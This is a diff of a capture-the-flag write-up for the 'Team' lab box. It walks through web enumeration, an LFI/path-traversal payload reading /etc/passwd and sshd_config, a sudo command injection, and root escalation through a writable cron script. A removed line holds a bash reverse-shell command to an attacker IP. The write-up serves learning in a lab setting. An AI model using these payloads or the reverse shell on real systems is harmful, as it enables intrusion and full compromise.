@@ -26,41 +26,42 @@ Nmap done at Fri Mar  5 21:49:38 2021 -- 1 IP address (1 host up) scanned in 17.
 ```
 
 
-* Next I had a quick look at the page using the browser
-* Only the Apache2 Ubuntu Default Page was shown
-* Having a look at the Source showed that I have to hadd 'team.thm' to my hosts file
+* Next I had a quick look at the web page
+* Only the _Apache2 Ubuntu Default Page_ was shown
+* Having a look at the Source showed that I have to add 'team.thm' to my hosts file
 
 
 ![image](https://user-images.githubusercontent.com/78683952/110202466-24dc1100-7e69-11eb-8fb3-ff424a266bd9.png)
 
 
-* After putting team.thm into my hosts file the following page appeared
+* After putting _team.thm_ into my hosts file the following page appeared
 
 ![image](https://user-images.githubusercontent.com/78683952/110202498-59e86380-7e69-11eb-9058-0cab1a29e2eb.png)
 
 
-* Next I ran gobuster and found the hidden directory *scripts*
-** gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://team.thm -x .txt
+* Next I ran **gobuster** and found the hidden directory *scripts*
+`gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://team.thm`
 
 ![image](https://user-images.githubusercontent.com/78683952/110202590-04f91d00-7e6a-11eb-8267-ee5f922b27c5.png)
 
 
 * Wthin this directory there is a file called *script.txt*
-** gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://team.thm/scripts/ -x .txt
+`gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://team.thm/scripts/ -x .txt`
 
 ![image](https://user-images.githubusercontent.com/78683952/110202593-104c4880-7e6a-11eb-9aa7-bc1f84518ea0.png)
 
 
-* Browsing to http://team.thm/scripts/script.txt shows us the following:
+* Browsing to http://team.thm/scripts/script.txt displays the following:
 
 ![image](https://user-images.githubusercontent.com/78683952/110202629-52758a00-7e6a-11eb-81f0-f54c1c889b14.png)
 
-* the hint on the very bottom made my try to access: http://team.thm/scripts/script.old
-* Voila :) 
+* the hint on the very bottom made me try to access: _http://team.thm/scripts/script.old_
+
+Voilà :) 
 
 ![image](https://user-images.githubusercontent.com/78683952/110202655-7df87480-7e6a-11eb-814f-a3717c2f217a.png)
 
-We now have FTP Credentials and can use them to login in to the FTP Server 
+We now have FTP Credentials and can use them to login to the FTP service 
 
 ![image](https://user-images.githubusercontent.com/78683952/110202739-fa8b5300-7e6a-11eb-9ab1-b9aef3554d17.png)
 
@@ -68,7 +69,7 @@ We now have FTP Credentials and can use them to login in to the FTP Server
 
 ![image](https://user-images.githubusercontent.com/78683952/110202795-43dba280-7e6b-11eb-81bf-f7380ce1afec.png)
 
-It seems like we have to adjust the entry in our host file from **team.thm** to **dev.team.thm**
+It seems like we have to adjust the entry in our hosts file from **team.thm** to **dev.team.thm**
 Furthermore, the two names within the .txt file look like usernames.
 
 * Browsing to **dev.team.thm** shows us the following
@@ -82,11 +83,11 @@ The `page=teamshare.php` looks very suspicious.
 
 Lets try: `page=../../../../etc/passwd `
 
-Voila
+Nice :)
 
 ![image](https://user-images.githubusercontent.com/78683952/110203009-14796580-7e6c-11eb-9871-203f47cfba80.png)
 
-* Being able to exploit this Directory Traversal and LFI Vulnerabilty we can now try to find the id_rsa that was mentioned in the **New_site.txt** 
+* Being able to exploit this **Directory Traversal **/ **LFI Vulnerabilty** we can now try to find the **id_rsa** that was mentioned in the **New_site.txt** 
 ** view-source:http://dev.team.thm/script.php?page=php://filter/resource=../../../../etc/ssh/sshd_config
 
 ![image](https://user-images.githubusercontent.com/78683952/110203090-6d48fe00-7e6c-11eb-9ca7-81992d6ec662.png)
@@ -96,19 +97,63 @@ Voila
 ![image](https://user-images.githubusercontent.com/78683952/110203173-d92b6680-7e6c-11eb-9721-f1280cd13e88.png)
 
 
-
-*** username and password
-* connect to FTP
-* download New_ ...
-* put dev.team.thm into your host file
-* directory traversal
-** http://dev.team.thm/script.php?page=../../../home/dale/user.txt
-*view-source:http://dev.team.thm/script.php?page=php://filter/resource=../../../../etc/ssh/sshd_config
-
-
 # Steps to root.txt
-* enumerate gyles
-** become member of admin
-* write to script
-* echo "/bin/bash -c '/bin/bash >& /dev/tcp/10.9.4.238/4444 0>&1'" >> /usr/local/bin/main_backup.sh
+## Enumeration
+
+What I almost always do first is `sudo -l`
+
+![image](https://user-images.githubusercontent.com/78683952/110238487-3a713980-7f42-11eb-8caf-478c68087569.png)
+
+That looks interesting. Let's check out **/home/gyles/admin_checks**
+
+![image](https://user-images.githubusercontent.com/78683952/110238529-6c829b80-7f42-11eb-8113-feb52c8605ab.png)
+
+The lines outlined in red look interesting. It seems as if the provided user input will be executed without any further sanitization.
+
+So, I started the script with the following line:
+`sudo -u gyles /home/gyles/admin_checks`
+
+and then provided `/bin/bash` as the _date argument_
+
+![image](https://user-images.githubusercontent.com/78683952/110238654-3265c980-7f43-11eb-9d0e-b42a210da0a1.png)
+
+We are now in the context of gyles. 
+
+![image](https://user-images.githubusercontent.com/78683952/110238742-883a7180-7f43-11eb-9e87-d9c335c01a69.png)
+
+Gyles is a member of the admin group. Let's take a note of that.
+
+We are continuing our enumeration with **linpeas.sh** (https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
+
+The screenshot below shows something interesting:
+
+![image](https://user-images.githubusercontent.com/78683952/110238966-bec4bc00-7f44-11eb-98e4-e6a268b55895.png)
+
+Inside the **/opt/admin_stuff/** directory I found **script.sh**
+
+![image](https://user-images.githubusercontent.com/78683952/110239001-f2074b00-7f44-11eb-954e-ae5f836ed34a.png)
+
+Interesting. So **/usr/local/bin/main_backup.sh** is executed every minute.
+
+Let's find out what it does:
+
+![image](https://user-images.githubusercontent.com/78683952/110239046-372b7d00-7f45-11eb-846c-1880ebeb2722.png)
+
+It basically just copies the content of one directory into another.
+
+Checking out the destination directory shows us that the task is being performed as root.
+
+And the good thing about it is, being a member of the admin group gives us write access to **/usr/local/bin/main_backup.sh***
+
+So all that's left to do is
+* starting a netcat listener
+* putting a reverse shell into main_backup.sh
+* wait maximum 1 minute
+
+![image](https://user-images.githubusercontent.com/78683952/110239267-5aa2f780-7f46-11eb-870e-2d73b1895f3c.png)
+
+* and of course get root.txt :)
+
+![image](https://user-images.githubusercontent.com/78683952/110239296-773f2f80-7f46-11eb-875b-4697e646581d.png)
+
 
